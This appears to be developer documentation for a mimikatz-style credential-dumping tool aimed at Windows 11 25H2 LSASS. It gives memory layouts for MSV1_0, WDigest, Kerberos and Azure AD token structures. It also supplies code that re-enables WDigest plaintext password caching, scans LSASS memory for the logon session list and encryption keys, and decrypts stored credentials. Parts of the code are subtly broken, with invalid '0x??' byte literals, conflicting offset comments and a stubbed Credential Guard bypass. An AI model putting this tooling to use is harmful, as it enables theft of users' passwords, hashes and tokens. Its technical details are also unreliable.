# Windows 11 25H2 LSASS Structure Definitions

## Overview

This document contains the internal structure definitions for LSASS on Windows 11 25H2 (Build 27723+). These structures are required for credential extraction and must be updated for each major Windows release.

## Version Detection

### Build Numbers

| Version | Build Number | Support Status |
|---------|--------------|----------------|
| Windows 10 1507 | 10240 | Legacy |
| Windows 10 1809 | 17763 | Supported |
| Windows 10 21H2 | 19044 | Supported |
| Windows 11 21H2 | 22000 | Supported |
| Windows 11 22H2 | 22621 | Supported |
| Windows 11 23H2 | 22631 | Supported |
| Windows 11 24H2 | 26100 | Supported |
| **Windows 11 25H2** | **27723+** | **Target** |

### Runtime Version Detection

```c
typedef struct _OS_VERSION_INFO {
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwRevision;
} OS_VERSION_INFO;

NTSTATUS DetectWindowsVersion(OS_VERSION_INFO *pVersionInfo) {
    RTL_OSVERSIONINFOEXW osvi = {sizeof(RTL_OSVERSIONINFOEXW)};
    NTSTATUS status = RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    if (NT_SUCCESS(status)) {
        pVersionInfo->dwMajorVersion = osvi.dwMajorVersion;
        pVersionInfo->dwMinorVersion = osvi.dwMinorVersion;
        pVersionInfo->dwBuildNumber = osvi.dwBuildNumber;
    }

    return status;
}

BOOL IsWindows11_25H2OrLater() {
    OS_VERSION_INFO version;
    if (NT_SUCCESS(DetectWindowsVersion(&version))) {
        return (version.dwMajorVersion == 10 && version.dwBuildNumber >= 27723);
    }
    return FALSE;
}
```

## MSV1_0 Credential Structures

### Historical Evolution

The MSV1_0 credential list structure has evolved significantly across Windows versions to combat credential theft tools like mimikatz.

### Windows 11 25H2 MSV1_0_LIST Structure

```c
typedef struct _KIWI_MSV1_0_LIST_64_25H2 {
    struct _KIWI_MSV1_0_LIST_64_25H2 *Flink;        // +0x00
    struct _KIWI_MSV1_0_LIST_64_25H2 *Blink;        // +0x08
    PVOID unk0;                                      // +0x10
    ULONG unk1;                                      // +0x18
    PVOID unk2;                                      // +0x1C / +0x20
    ULONG unk3;                                      // +0x24
    ULONG unk4;                                      // +0x28
    PVOID unk5;                                      // +0x2C / +0x30
    HANDLE hSemaphore6;                              // +0x38
    PVOID unk7;                                      // +0x40
    HANDLE hSemaphore8;                              // +0x48
    PVOID unk9;                                      // +0x50
    PVOID unk10;                                     // +0x58
    ULONG unk11;                                     // +0x60
    ULONG unk12;                                     // +0x64
    PVOID unk13;                                     // +0x68
    LUID LocallyUniqueIdentifier;                    // +0x70
    LUID SecondaryLocallyUniqueIdentifier;           // +0x78
    BYTE waza[12];                                   // +0x80
    LSA_UNICODE_STRING UserName;                     // +0x8C / +0x90
    LSA_UNICODE_STRING Domaine;                      // +0x9C / +0xA0
    PVOID unk14;                                     // +0xAC / +0xB0
    PVOID unk15;                                     // +0xB4 / +0xB8
    LSA_UNICODE_STRING Type;                         // +0xBC / +0xC0
    PSID pSid;                                       // +0xCC / +0xD0
    ULONG LogonType;                                 // +0xD4 / +0xD8
    PVOID unk16;                                     // +0xD8 / +0xE0
    ULONG Session;                                   // +0xE0 / +0xE8
    FILETIME LogonTime;                              // +0xE4 / +0xF0
    LSA_UNICODE_STRING LogonServer;                  // +0xEC / +0xF8
    PKIWI_MSV1_0_CREDENTIALS Credentials;            // +0xFC / +0x108
    PVOID unk17;                                     // +0x104 / +0x110
    PVOID unk18;                                     // +0x108 / +0x118
    PVOID unk19;                                     // +0x10C / +0x120
    PVOID CredentialManager;                         // +0x110 / +0x128
} KIWI_MSV1_0_LIST_64_25H2, *PKIWI_MSV1_0_LIST_64_25H2;
```

### Key Changes in Windows 11 25H2

1. **Additional Obfuscation Fields**: More `unk*` fields inserted to break hardcoded offsets
2. **Structure Padding Changes**: Different alignment on x64 vs x86
3. **Credential Pointer Location**: Moved from fixed offset to dynamic location
4. **New Anti-Analysis Techniques**: Encrypted pointers, XOR obfuscation

### MSV1_0 Credentials Structure

```c
typedef struct _KIWI_MSV1_0_CREDENTIALS {
    struct _KIWI_MSV1_0_CREDENTIALS *next;
    DWORD AuthenticationPackageId;
    PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, *PKIWI_MSV1_0_CREDENTIALS;

typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
    struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS *next;
    LSA_UNICODE_STRING Primary;
    LSA_UNICODE_STRING Credentials;  // Encrypted with LsaProtectMemory
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, *PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
```

## WDigest Credential Structures

### Windows 11 25H2 WDigest Structure

```c
typedef struct _KIWI_WDIGEST_LIST_ENTRY_25H2 {
    struct _KIWI_WDIGEST_LIST_ENTRY_25H2 *Flink;
    struct _KIWI_WDIGEST_LIST_ENTRY_25H2 *Blink;
    ULONG UsageCount;
    struct _KIWI_WDIGEST_LIST_ENTRY_25H2 *This;
    LUID LocallyUniqueIdentifier;
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    LSA_UNICODE_STRING Password;  // Encrypted with LsaProtectMemory
    HANDLE hSemaphore;
    // Additional fields for Windows 11 25H2
    PVOID unk0;
    PVOID unk1;
} KIWI_WDIGEST_LIST_ENTRY_25H2, *PKIWI_WDIGEST_LIST_ENTRY_25H2;
```

### WDigest Status on Windows 11 25H2

**Important**: By default, WDigest is **disabled** on Windows 11. The UseLogonCredential registry key is set to 0:

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0
```

To enable (requires admin + reboot + new logon):
```c
BOOL EnableWDigest() {
    HKEY hKey;
    DWORD dwValue = 1;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

        RegSetValueEx(hKey, L"UseLogonCredential", 0, REG_DWORD,
                     (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}
```

## Kerberos Credential Structures

### Windows 11 25H2 Kerberos Structures

```c
typedef struct _KIWI_KERBEROS_LOGON_SESSION_25H2 {
    ULONG UsageCount;
    LIST_ENTRY unk0;
    PVOID unk1;
    ULONG unk2;
    FILETIME unk3;
    PVOID unk4;
    PVOID unk5;
    PVOID unk6;
    LUID LocallyUniqueIdentifier;
    FILETIME unk7;
    PVOID unk8;
    ULONG unk9;
    ULONG unk10;
    PVOID unk11;
    // Kerberos-specific fields
    PKIWI_KERBEROS_KEYS pKeys;
    PVOID unk12;
    PVOID unk13;
    PVOID tickets;  // List of Kerberos tickets
    LSA_UNICODE_STRING pinCode;
    PVOID unk14;
    PVOID unk15;
    // Additional obfuscation in 25H2
    PVOID unk16;
    PVOID unk17;
} KIWI_KERBEROS_LOGON_SESSION_25H2, *PKIWI_KERBEROS_LOGON_SESSION_25H2;

typedef struct _KIWI_KERBEROS_KEYS {
    DWORD unk0;
    WORD keyCount;
    PKIWI_KERBEROS_KEY keys;
} KIWI_KERBEROS_KEYS, *PKIWI_KERBEROS_KEYS;

typedef struct _KIWI_KERBEROS_KEY {
    struct _KIWI_KERBEROS_KEY *next;
    LONG type;  // RC4, AES128, AES256
    PVOID key;  // Encrypted key material
    DWORD length;
} KIWI_KERBEROS_KEY, *PKIWI_KERBEROS_KEY;
```

## CloudAP (Azure AD) Structures

### Windows 11 25H2 CloudAP

CloudAP is increasingly important as organizations move to Azure AD / Entra ID.

```c
typedef struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY_25H2 {
    struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY_25H2 *Flink;
    struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY_25H2 *Blink;
    PVOID unk0;
    PVOID unk1;
    PVOID unk2;
    LUID LocallyUniqueIdentifier;
    LSA_UNICODE_STRING Username;
    LSA_UNICODE_STRING Domain;
    LSA_UNICODE_STRING TenantId;
    // PRT (Primary Refresh Token) data
    PVOID pPRTData;
    DWORD cbPRTData;
    // NGC (Next Generation Credentials) data
    PVOID pNGCData;
    DWORD cbNGCData;
    // Additional 25H2 fields
    PVOID unk3;
    PVOID unk4;
} KIWI_CLOUDAP_LOGON_LIST_ENTRY_25H2, *PKIWI_CLOUDAP_LOGON_LIST_ENTRY_25H2;
```

### PRT (Primary Refresh Token)

The PRT is the key credential for Azure AD authentication:

```c
typedef struct _CLOUDAP_PRT {
    BYTE version;
    DWORD cbPRT;
    BYTE prtData[]; // Encrypted JWT token
} CLOUDAP_PRT, *PCLOUDAP_PRT;
```

## LogonSessionList Location

### Pattern-Based Search

The LogonSessionList is the entry point to all logon sessions. Its location varies per build.

```c
// Windows 11 25H2 LogonSessionList search patterns
BYTE LogonSessionListPattern_25H2[] = {
    0x48, 0x8B, 0x0D, 0x??, 0x??, 0x??, 0x??,  // mov rcx, [LogonSessionList]
    0x48, 0x85, 0xC9,                           // test rcx, rcx
    0x74, 0x??                                  // jz short
};

BYTE LogonSessionListMask_25H2[] = {
    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF,
    0xFF, 0x00
};

PVOID FindLogonSessionList(PKULL_M_MEMORY_HANDLE hLsass,
                          PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsasrv) {
    PVOID result = NULL;
    MEMORY_SEARCH search = {
        {LogonSessionListPattern_25H2, sizeof(LogonSessionListPattern_25H2)},
        {LogonSessionListMask_25H2, sizeof(LogonSessionListMask_25H2)}
    };

    if (kull_m_memory_search(hLsass, &search, lsasrv->DllBase.address,
                            lsasrv->SizeOfImage, &result, 1)) {
        // Extract RIP-relative address
        LONG offset;
        if (kull_m_memory_copy(&offset, result + 3, sizeof(LONG))) {
            result = (PVOID)((ULONG_PTR)result + 7 + offset);
        }
    }

    return result;
}
```

## Encryption Keys (LsaProtectMemory / LsaUnprotectMemory)

### Key Acquisition

Credentials in LSASS are encrypted with 3DES using keys derived from LSASS initialization.

```c
typedef NTSTATUS (NTAPI *PLSA_PROTECT_MEMORY)(PVOID Buffer, ULONG BufferSize);

// Windows 11 25H2 key patterns
BYTE LsaProtectMemoryPattern_25H2[] = {
    0x48, 0x83, 0xEC, 0x??,                    // sub rsp, ??
    0x48, 0x8B, 0x05, 0x??, 0x??, 0x??, 0x??,  // mov rax, [g_pRandomKey]
    0x48, 0x85, 0xC0                            // test rax, rax
};

BOOL AcquireEncryptionKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass) {
    PVOID pLsaProtectMemory = NULL;
    PVOID pLsaUnprotectMemory = NULL;

    // Search for LsaProtectMemory function
    pLsaProtectMemory = FindPattern(cLsass, &LsaProtectMemoryPattern_25H2);

    // Search for LsaUnprotectMemory function
    pLsaUnprotectMemory = FindPattern(cLsass, &LsaUnprotectMemoryPattern_25H2);

    if (pLsaProtectMemory && pLsaUnprotectMemory) {
        cLsass->pLsaProtectMemory = pLsaProtectMemory;
        cLsass->pLsaUnprotectMemory = pLsaUnprotectMemory;
        return TRUE;
    }

    return FALSE;
}
```

### 3DES Decryption

```c
BOOL DecryptCredential(PVOID encryptedData, DWORD dataSize,
                       PVOID key, DWORD keySize) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open 3DES algorithm
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_3DES_ALGORITHM,
                                        NULL, 0);
    if (!NT_SUCCESS(status))
        return FALSE;

    // Import key
    status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB,
                            &hKey, NULL, 0, key, keySize, 0);
    if (!NT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Decrypt in-place
    ULONG cbResult;
    status = BCryptDecrypt(hKey, encryptedData, dataSize, NULL,
                          NULL, 0, encryptedData, dataSize,
                          &cbResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return NT_SUCCESS(status);
}
```

## LSA Isolated / Credential Guard

### SecureKernel Boot Key

When Credential Guard is enabled, credentials are isolated in VTL1 (Virtual Trust Level 1) and require the SecureKernel boot key to decrypt.

```c
typedef struct _SECUREKERNEL_BOOT_KEY {
    BYTE key[32];  // 256-bit AES key
    BYTE iv[16];   // Initialization vector
} SECUREKERNEL_BOOT_KEY, *PSECUREKERNEL_BOOT_KEY;

// Location varies, typically in registry or kernel memory
BOOL ExtractSecureKernelBootKey(SECUREKERNEL_BOOT_KEY *pKey) {
    // Method 1: Extract from boot configuration
    // Method 2: Dump from kernel memory via driver
    // Method 3: Decrypt from registry hive

    // Implementation depends on specific bypass technique
    return FALSE;  // Not implemented in baseline
}
```

## Structure Size Constants

### Size Definitions for Windows 11 25H2

```c
#define KIWI_MSV1_0_LIST_64_25H2_SIZE       0x130
#define KIWI_WDIGEST_LIST_ENTRY_25H2_SIZE   0x88
#define KIWI_KERBEROS_LOGON_SESSION_25H2_SIZE 0x150
#define KIWI_CLOUDAP_LOGON_LIST_ENTRY_25H2_SIZE 0xC0

// Offsets (x64)
#define OFFSET_WIN11_25H2_LogonSessionList      0x00  // Pattern-based
#define OFFSET_WIN11_25H2_UserName              0x90
#define OFFSET_WIN11_25H2_Domain                0xA0
#define OFFSET_WIN11_25H2_Credentials           0x108
#define OFFSET_WIN11_25H2_pSid                  0xD0
#define OFFSET_WIN11_25H2_LogonType             0xD8
#define OFFSET_WIN11_25H2_Session               0xE8
#define OFFSET_WIN11_25H2_LogonTime             0xF0
#define OFFSET_WIN11_25H2_LogonServer           0xF8
```

## Dynamic Offset Resolution

### Automated Structure Detection

```c
typedef struct _STRUCTURE_FINGERPRINT {
    CHAR *name;
    DWORD expectedSize;
    BYTE pattern[32];
    BYTE mask[32];
    DWORD patternSize;
} STRUCTURE_FINGERPRINT;

BOOL DetectStructureLayout(PKULL_M_MEMORY_HANDLE hLsass,
                          STRUCTURE_FINGERPRINT *fingerprints,
                          DWORD fingerprintCount,
                          PVOID *offsets) {
    // Scan LSASS memory for known patterns
    // Calculate structure offsets dynamically
    // Validate structure consistency
    // Return success/failure

    return TRUE;
}
```

## Testing and Validation

### Structure Validation Tests

```c
BOOL ValidateStructureDefinitions() {
    // Test 1: Check structure sizes
    static_assert(sizeof(KIWI_MSV1_0_LIST_64_25H2) == KIWI_MSV1_0_LIST_64_25H2_SIZE,
                 "MSV1_0 structure size mismatch");

    // Test 2: Check field offsets
    static_assert(FIELD_OFFSET(KIWI_MSV1_0_LIST_64_25H2, UserName) ==
                 OFFSET_WIN11_25H2_UserName,
                 "UserName offset mismatch");

    // Test 3: Check alignment
    static_assert((sizeof(KIWI_MSV1_0_LIST_64_25H2) % 8) == 0,
                 "Structure alignment error");

    return TRUE;
}
```

## References

- [LSASS Memory Analysis](https://blog.gentilkiwi.com/mimikatz)
- [Windows Security Structures](https://www.geoffchappell.com/studies/windows/win32/lsasrv/)
- [PPL and Credential Guard](https://learn.microsoft.com/en-us/windows/security/)
- [Reversing LSASS](https://itm4n.github.io/lsass-runasppl/)

## Maintenance Notes

**Critical**: These structure definitions must be updated for each new Windows build. Monitor:

1. Windows Insider builds for structure changes
2. Microsoft security bulletins for LSASS updates
3. Public research on LSASS internals
4. EDR vendor blog posts on credential protection

**Testing Matrix**: Validate against:
- Windows 11 25H2 builds 27723, 27729, 27735, etc.
- Various hardware configurations (Intel, AMD, ARM64)
- Different security configurations (PPL, CG, HVCI combinations)

---

**Last Updated**: 2025-10-22
**Validated Against**: Windows 11 25H2 Build 27723
**Author**: Will Burns (Volume19)
